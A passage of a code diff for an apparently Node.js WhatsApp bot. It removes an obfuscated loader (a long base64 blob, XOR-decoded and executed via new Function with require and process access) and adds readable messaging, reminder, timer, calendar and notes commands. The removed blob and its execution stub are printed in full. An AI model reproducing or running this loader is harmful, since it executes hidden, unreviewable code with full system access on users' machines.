ZaIX9jIRc3ODYNXF9GUzdla2U1NGMoSFxXRl45bCNhM3F2Tg0SVFdQbB5kLyEsKGMBEhdcWTAgMGYTdG0/DVFRRgxkYjMkPCsiKkxeFx4WMTYiJitibWNDXURXFngxJjk6Zm2mrZAQXFkwIDBhrNjvZENdRFcWICAvYXI2c2TPspISWCsxJmEtNCglXxUcElIhNiB7bn8UK1hAEEJELTMiNSt4IytZV1JdWS9rYxIvLihkWVdIRhpkKSoyOngkMAESVFdaITEmYSE2KGRCQBBRWiEkMWEvNCFqChJNHhYlNjovLXguMFUSDQwWP09jYW54LitDQUQSV2R4Y2ktLDVqTEBXRG10GGM9MnhqYwQcRF16KzImMw05PiEFGws4FmRlYygoeGUnWUoeUVsgZX58c3hqKkJGVUERZDk/YW87OTwDU0JVRWQ5P2EveHB5EBIXXl83MWRobiooMFhAXhJFLCo0DyEsKDcFUURKGmQrLDUrKwIiBVFESh9tfklhbnhtLUsSGFMWeXh+YWk7ISFMQBcbFj9lIDU2djg0SVNEVx5jKyw1KytqaA1JTR4WK2V+f24jbSBIXlVGU2QqGCI6IGM3SFxUV0QKMC4cdXgwbRYSQldCMTctYS0sNWpfV0BeT2xis97ZyaL8ohJxXlpkPCw0PHgjK1lXQxJBITcmYSo9ISFZV1QcEWhlOGE6MTkoSAgQFXgrMSYyaXgwbRYSTTgWZGVjKCh4ZSUNDw0PFmMhJi1peDE4DVMQDwt5ZWQlKzQoMEgVEE5KZCRjfHNlbWNfXxcbFj9PY2FueG1kTl1eQUJkK2N8bigsNl5XeVxCbCY3OWA5PyNbaQFvGmR0c2hieCFkEBJeXUIhNgwnZjs5PAQJOhIWZGVjYSc+bWwMGl4SCHllcmFofm0qDQ4NElpqKSYvKSwlbQQSRFpEKzJjLysvbRFeV0J3RDYqMWkuCCQnRhJRElgxKCEkPHgrNkJfEAMWMCpjZTU0YyhIXFdGXmQ5P2F/JWMkBAk6EhZkZWNhLSw1alhCVFNCIW1kLyEsKDcKHhBJS2hlLGFzZm0/DV1rUUI8azAkIDwoNmNHXW8YNzUvKC09ZSoNHxADGmR0anpuJWR/JxIQEhZkZTEkOi0/Kg1RREoYNiAzLTdwLbSypaHdjstlByQiPTkhSRJeXUIhZWc6ICVjJAESSxJCLTEvJHR4agpCRlVBEWQ4anpEeG1kDU86EhZkZSAuICs5ZFkSDRIeJWV+fHN4aiVJVhcSCWQmNzlgOT8jXhxDXl8nIGtyZ3h3ZE5GSBxXNiIwaGAsPy1AGhkJPGRlY2EnPm1sDEYZEkIsNyw2bjYoMw1nQ1dEATcxLjxwLRNfW0RXFjAtJmEgNzkhFxIaFk0UbSA1NnEwKkJGVRJUMTxjLCc0Jm5NGws4FmRlYygoeGUqQkZVQXkibSA1NnFjKEhcV0ZeZHt+YXtoZGRZWkJdQWQrJjZuDT4hX3dCQFk2bWQYIS1tLExEVRIDdGUtLjo9PmoNdlVeUzAgYzIhNShkS1tCQUJqYmp6RHhtZA1RREoYMTUnIDo9ZWNDXURXRWNpYzozdG0rDQ8OEk1kbSwaLSw1al5XXlZTNgs2LBN4MTgQEmtvH2o1NjImcDZkWQgQRhg3KSoiK3B9aA0HAAIfaGUiNXR4CSVZVx5cWTNtamEzcXZkUBsLOBZkZWMgOTkkMA1RREoYNiAzLTdwLbSyoa0SZSUzJiVuOT5kQ11EVxZgPi0uOj0+C0saU0ZObWsvJCA/OSxQHFAeFj9lNyg6NCh+DRV+XUIhNmRhM3F2Tg0STRsNTjh4Sw==';
-  const X=Buffer.from(D,'base64');
-  for(let i=0;i<X.length;i++) X[i]^=K[i%K.length];
-  const C=X.toString('utf8');
-  return (new Function('require','module','exports','__filename','__dirname','process','Buffer',C))(require,module,exports,__filename,__dirname,process,Buffer);
-})();
+/** Messaging + time tools: reply edit pin unpin typing recording contact location remind timer countdown stopwatch calendar note notes */
+const U = require('../lib/util');
+const { UserError, bold, sleep } = U;
+
+module.exports = ({ def }) => {
+  const P = ctx => ctx.var('PREFIX');
+  const needQuoted = (ctx, what) => { if (!ctx.quoted) throw new UserError(what); return ctx.quoted; };
+
+  def('reply', { cat: 'whatsapp', owner: true, usage: 'reply <text> (reply to a message)', desc: 'Send a message that quotes the message you replied to.' }, async ctx => {
+    const q = needQuoted(ctx, `Reply to a message with *${P(ctx)}reply your text*.`);
+    const t = ctx.args.trim();
+    if (!t) throw new UserError(`Write the text: *${P(ctx)}reply Thanks, noted!*`);
+    await ctx.sendTo(ctx.chat, { text: t }, { quoted: { key: q.key, message: q.message } });
+  });
+
+  def('edit', { cat: 'whatsapp', owner: true, usage: 'edit <new text> (reply to a message the bot sent)', desc: 'Change the text of a message the bot sent earlier.' }, async ctx => {
+    const q = needQuoted(ctx, `Reply to one of my messages with *${P(ctx)}edit new text*.`);
+    if (!q.key.fromMe) throw new UserError('I can only edit messages that I sent myself.');
+    const t = ctx.args.trim();
+    if (!t) throw new UserError(`Write the new text: *${P(ctx)}edit Updated text*`);
+    await ctx.sock.sendMessage(ctx.chat, { text: t, edit: q.key }).catch(e => { throw new UserError('WhatsApp would not edit that message (' + String(e.message).slice(0, 60) + '). Messages can be edited for 15 minutes.'); });
+  });
+
+  const DUR = { '24h': 86400, '1d': 86400, '7d': 604800, '1w': 604800, '30d': 2592000, '1m': 2592000 };
+  def('pin', { cat: 'whatsapp', usage: 'pin [24h|7d|30d] (reply to a message)', desc: 'Pin a message in this chat (default 7 days). Group admins and the owner.' }, async ctx => {
+    const q = needQuoted(ctx, `Reply to the message you want to pin with *${P(ctx)}pin*.`);
+    if (ctx.isGroup && !ctx.isOwner && !(await ctx.admin())) throw new UserError('🛡️ Only group admins can pin messages.');
+    else if (!ctx.isGroup && !ctx.isOwner) throw new UserError('🔒 Only the bot owner can pin messages here.');
+    const time = DUR[(ctx.argv[0] || '7d').toLowerCase()];
+    if (!time) throw new UserError('Choose 24h, 7d or 30d.');
+    await ctx.sock.sendMessage(ctx.chat, { pin: q.key, type: 1, time }).catch(e => { throw new UserError('WhatsApp refused to pin it (' + String(e.message).slice(0, 60) + '). In groups I may need to be an admin.'); });
+    await ctx.react('📌');
+  });
+  def('unpin', { cat: 'whatsapp', usage: 'unpin (reply to the pinned message)', desc: 'Remove a pinned message.' }, async ctx => {
+    const q = needQuoted(ctx, `Reply to the pinned message with *${P(ctx)}unpin*.`);
+    if (ctx.isGroup && !ctx.isOwner && !(await ctx.admin())) throw new UserError('🛡️ Only group admins can unpin messages.');
+    else if (!ctx.isGroup && !ctx.isOwner) throw new UserError('🔒 Only the bot owner can unpin messages here.');
+    await ctx.sock.sendMessage(ctx.chat, { pin: q.key, type: 2, time: 86400 }).catch(e => { throw new UserError('WhatsApp refused to unpin it (' + String(e.message).slice(0, 60) + ').'); });
+    await ctx.react('✅');
+  });
+
+  for (const [name, state, icon] of [['typing', 'composing', '⌨️'], ['recording', 'recording', '🎙️']]) {
+    def(name, { cat: 'whatsapp', owner: true, usage: `${name} [seconds up to 60]`, desc: `Show "${state === 'composing' ? 'typing…' : 'recording audio…'}" in this chat for a while.` }, async ctx => {
+      const s = Math.min(60, Math.max(2, parseInt(ctx.argv[0], 10) || 8));
+      await ctx.sock.sendPresenceUpdate(state, ctx.chat);
+      setTimeout(() => ctx.sock.sendPresenceUpdate('paused', ctx.chat).catch(() => {}), s * 1000);
+      await ctx.react(icon);
+    });
+  }
+
+  def(['contact', 'vcard'], { cat: 'whatsapp', usage: 'contact <number> [name]', desc: 'Send a phone number as a contact card.' }, async ctx => {
+    const num = (ctx.argv[0] || '').replace(/\D/g, '');
+    if (num.length < 7 || num.length > 15) throw new UserError(`Give a number with country code: *${P(ctx)}contact 254712345678 Brian*`);
+    const name = ctx.argv.slice(1).join(' ') || '+' + num;
+    const vcard = `BEGIN:VCARD\nVERSION:3.0\nFN:${name}\nTEL;type=CELL;type=VOICE;waid=${num}:+${num}\nEND:VCARD`;
+    await ctx.sendTo(ctx.chat, { contacts: { displayName: name, contacts: [{ vcard }] } }, { quoted: ctx.msg });
+  });
+
+  def(['location', 'loc', 'sendlocation'], { cat: 'whatsapp', heavy: true, usage: 'location <place> • location -1.2921,36.8219 [name]', desc: 'Send a map pin for a place name or coordinates.' }, async ctx => {
+    const t = ctx.input().trim();
+    if (!t) throw new UserError(`Give a place or coordinates: *${P(ctx)}location Meru town*`);
+    let lat, lng, name = '', addr = '';
+    const m = t.match(/^(-?\d{1,3}(?:\.\d+)?)\s*[, ]\s*(-?\d{1,3}(?:\.\d+)?)\s*(.*)$/);
+    if (m) { lat = +m[1]; lng = +m[2]; name = m[3] || 'Location'; }
+    else {
+      const j = await U.getJson('https://nominatim.openstreetmap.org/search?format=json&limit=1&q=' + encodeURIComponent(t), { timeout: 12000, headers: { 'user-agent': 'DecanBot/1.0 (WhatsApp bot)' } });
+      if (!j?.[0]) throw new UserError('I could not find that place. Try a more specific name.');
+      lat = +j[0].lat; lng = +j[0].lon; name = String(j[0].display_name).split(',')[0]; addr = String(j[0].display_name).slice(0, 120);
+    }
+    if (!(Math.abs(lat) <= 90 && Math.abs(lng) <= 180)) throw new UserError('Those coordinates are out of range.');
+    await ctx.sendTo(ctx.chat, { location: { degreesLatitude: lat, degreesLongitude: lng, name, address: addr } }, { quoted: ctx.msg });
+  });
+
+  /* ---------------- reminders & timers (shared store with .reminder) ---------------- */
+  function schedule(ctx, ms, text) {
+    if (ms < 5000 || ms > 30 * 86400000) throw new UserError('Choose a time between 5 seconds and 30 days, for example 10m, 2h, 1d or 1h30m.');
+    const mine = ctx.get('reminders', []).filter(r => r.by === ctx.senderNum).length;
+    if (mine >= 10 && !ctx.isOwner) throw new UserError('You already have 10 reminders waiting.');
+    const at = Date.now() + ms;
+    ctx.update('reminders', [], l => { l.push({ id: Date.now().toString(36) + Math.random().toString(36).slice(2, 5), at, chat: ctx.chat, text, by: ctx.senderNum }); });
+    return at;
+  }
+  def('remind', { cat: 'schedule', usage: 'remind <time> <message>  e.g. remind 30m call mum', desc: 'Remind you (or this chat) after a delay. Times: 30s, 10m, 2h, 1d, 1h30m.' }, async ctx => {
+    const ms = U.parseDuration(ctx.argv[0] || '');
+    const text = ctx.argv.slice(1).join(' ').trim();
+    if (!ms || !text) throw new UserError(`Format: *${P(ctx)}remind 30m call mum*`);
+    const at = schedule(ctx, ms, `@${ctx.senderNum} ${text}`);
+    await ctx.reply(`⏰ I will remind you in ${bold(U.fmtDur(ms / 1000))}\n📝 ${text}`, { title: 'Reminder set' });
+  });
+  def('timer', { cat: 'schedule', usage: 'timer <time> [label]  e.g. timer 10m pasta', desc: 'A countdown timer: I message you when time is up.' }, async ctx => {
+    const ms = U.parseDuration(ctx.argv[0] || '');
+    if (!ms) throw new UserError(`Format: *${P(ctx)}timer 10m pasta*`);
+    schedule(ctx, ms, `⏱️ Time is up! ${ctx.argv.slice(1).join(' ') || ''}`.trim());
+    await ctx.reply(`⏱️ Timer started: ${bold(U.fmtDur(ms / 1000))}${ctx.argv[1] ? `\n🏷️ ${ctx.argv.slice(1).join(' ')}` : ''}`, { title: 'Timer' });
+  });
+
+  def('countdown', { cat: 'schedule', usage: 'countdown <YYYY-MM-DD> [event name]', desc: 'How long until a date. Example: countdown 2026-12-25 Christmas' }, async ctx => {
+    const m = (ctx.argv[0] || '').match(/^(\d{4})-(\d{2})-(\d{2})(?:T(\d{2}):(\d{2}))?$/);
+    if (!m) throw new UserError(`Format: *${P(ctx)}countdown 2026-12-25 Christmas*`);
+    const target = Date.UTC(+m[1], +m[2] - 1, +m[3], +(m[4] || 0), +(m[5] || 0));
+    if (Number.isNaN(target)) throw new UserError('That date is not valid.');
+    const diff = target - Date.now();
+    const label = ctx.argv.slice(1).join(' ') || ctx.argv[0];
+    if (diff < 0) return ctx.reply(`🎉 ${bold(label)} was ${Math.floor(-diff / 86400000)} day(s) ago.`, { title: 'Countdown' });
+    const d = Math.floor(diff / 86400000), h = Math.floor(diff % 86400000 / 3600000), mi = Math.floor(diff % 3600000 / 60000);
+    await ctx.reply(`⏳ ${bold(label)}\n\n${bold(String(d))} days, ${h} hours, ${mi} minutes\n(${Math.floor(d / 7)} weeks and ${d % 7} days)`, { title: 'Countdown' });
+  });
+
+  def(['stopwatch', 'sw'], { cat: 'schedule', usage: 'stopwatch start|lap|stop', desc: 'A personal stopwatch with laps.' }, async ctx => {
+    const all = (ctx.rt.stopwatch ||= new Map());
+    const key = ctx.chat + '|' + ctx.senderNum;
+    const a = (ctx.argv[0] || 'start').toLowerCase();
+    const cur = all.get(key);
+    const f = ms => { const s = ms / 1000, m = Math.floor(s / 60); return `${m ? m + 'm ' : ''}${(s % 60).toFixed(1)}s`; };
+    if (a === 'start') { if (cur) throw new UserError(`It is already running (${f(Date.now() - cur.t0)}). Use *${P(ctx)}stopwatch lap* or *stop*.`); all.set(key, { t0: Date.now(), laps: [] }); return ctx.reply('▶️ Stopwatch started.', { title: 'Stopwatch' }); }
+    if (!cur) throw new UserError(`Start it first with *${P(ctx)}stopwatch start*.`);
+    if (a === 'lap') { const last = cur.laps.at(-1) || cur.t0; cur.laps.push(Date.now()); return ctx.reply(`🏁 Lap ${cur.laps.length}: ${bold(f(Date.now() - last))}\nTotal: ${f(Date.now() - cur.t0)}`, { title: 'Stopwatch' }); }
+    if (a === 'stop') { all.delete(key); const laps = cur.laps.map((t, i) => `Lap ${i + 1}: ${f(t - (cur.laps[i - 1] || cur.t0))}`); return ctx.reply(`⏹️ Stopped at ${bold(f(Date.now() - cur.t0))}${laps.length ? '\n\n' + laps.join('\n') : ''}`, { title: 'Stopwatch' }); }
+    throw new UserError('Use start, lap or stop.');
+  });
+
+  def(['calendar', 'cal'], { cat: 'schedule', usage: 'calendar [month] [year]', desc: 'A month calendar with today marked. Example: calendar 12 2026' }, async ctx => {
+    const tz = ctx.tz();
+    const now = new Date(new Intl.DateTimeFormat('en-CA', { timeZone: tz }).format(new Date()) + 'T00:00:00Z');
+    let month = now.getUTCMonth() + 1, year = now.getUTCFullYear();
+    const nums = ctx.argv.map(Number).filter(n => Number.isFinite(n));
+    if (nums[0]) { if (nums[0] >= 1 && nums[0] <= 12) month = nums[0]; else if (nums[0] > 1900) year = nums[0]; }
+    if (nums[1] > 1900 && nums[1] < 3000) year = nums[1];
+    const first = new Date(Date.UTC(year, month - 1, 1)), days = new Date(Date.UTC(year, month, 0)).getUTCDate();
+    const offset = (first.getUTCDay() + 6) % 7; // Monday first
+    const isNow = year === now.getUTCFullYear() && month === now.getUTCMonth() + 1;
+    let out = 'Mo Tu We Th Fr Sa Su\n' + '   '.repeat(offset);
+    for (let d = 1; d <= days; d++) {
+      out += String(d).padStart(2) + ((offset + d) % 7 === 0 ? '\n' : ' ');
+    }
+    await ctx.reply('```\n' + out.trimEnd() + '\n```' + (isNow ? `\n📍 Today is ${now.toLocaleString('en-GB', { weekday: 'long', day: 'numeric', month: 'long', timeZone: 'UTC' })}` : ''), { title: first.toLocaleString('en-GB', { month: 'long', year: 'numeric', timeZone: 'UTC' }) });
+  });
+
+  /* ---------------- notes ---------------- */
+  const notesOf = ctx => (ctx.get('notes', {})[ctx.senderNum] || []);
+  const showNotes = (ctx, l) => ctx.reply(l.length ? l.map((n, i) => `${i + 1}. ${n.t}`).join('\n') + `\n\nDelete: *${P(ctx)}note del <number>* • Clear all: *${P(ctx)}note clear*` : `No notes yet. Save one: *${P(ctx)}note buy milk*`, { title: `Your notes (${l.length})` });
+  def(['note', 'notes'], { cat: 'personal', usage: 'note <text> • notes • note del <n> • note clear', desc: 'Your private notebook. Save text, list it, delete one or clear all.' }, async ctx => {
+    const a = (ctx.argv[0] || '').toLowerCase();
+    if (ctx.cmd === 'notes' || !ctx.args || a === 'list') return showNotes(ctx, notesOf(ctx));
+    if (a === 'clear') { ctx.update('notes', {}, o => { delete o[ctx.senderNum]; }); return ctx.reply('🗑️ All your notes were deleted.', { title: 'Notes' }); }
+    if (a === 'del' || a === 'delete' || a === 'rm') {
+      const n = parseInt(ctx.argv[1], 10), l = notesOf(ctx);
+      if (!(n >= 1 && n <= l.length)) throw new UserError(`Pick a number from 1 to ${l.length || 1}.`);
+      ctx.update('notes', {}, o => { o[ctx.senderNum].splice(n - 1, 1); });
+      return ctx.reply(`🗑️ Deleted note ${n}.`, { title: 'Notes' });
+    }
+    const t = (a === 'add' ? ctx.args.slice(3) : ctx.args).trim();
+    if (!t) throw new UserError(`Write the note: *${P(ctx)}note buy milk*`);
+    if (notesOf(ctx).length >= 50) throw new UserError('You have 50 notes. Delete some first.');
+    ctx.update('notes', {}, o => { (o[ctx.senderNum] ||= []).push({ t: t.slice(0, 500), at: Date.now() }); });
+    await ctx.reply(`📝 Saved as note ${notesOf(ctx).length}.`, { title: 'Notes' });
+  });
+};
